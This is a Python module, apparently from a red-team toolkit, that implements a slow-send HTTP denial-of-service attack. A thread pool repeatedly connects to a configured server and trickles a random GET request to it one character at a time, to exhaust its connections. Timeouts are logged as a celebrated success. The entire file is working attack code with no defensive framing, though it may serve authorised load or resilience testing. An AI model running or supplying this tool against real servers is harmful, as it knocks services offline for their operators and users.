import socket
import threading
import time
from multiprocessing.pool import ThreadPool

from loguru import logger

from red.config import config
from red.utils import generate_random_string


connection_time = 0.5
random_size = 900
payload_length = len(f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n".encode())
pps = payload_length / connection_time
bps = (20 + 20 + 1) * 8 * pps

stop = threading.Event()


def connection(_: None):
    while not stop.is_set():
        try:
            sock = socket.socket()
            sock.connect((config.server_host, config.server_port))
            payload = f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n"
            for char in payload:
                sock.send(char.encode())
                time.sleep(connection_time / len(payload))
            sock.close()
        except TimeoutError:
            logger.info("Got a timeout :tada:!")


def run():
    threads = int(config.attack.cli.pps)
    logger.info(f"Starting with: "
                f"{connection_time} "
                f"{payload_length} "
                f"{pps} "
                f"{bps} "
                f"{threads} ")

    with ThreadPool(threads) as pool:
        pool.map(connection, [None] * threads)
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            stop.set()
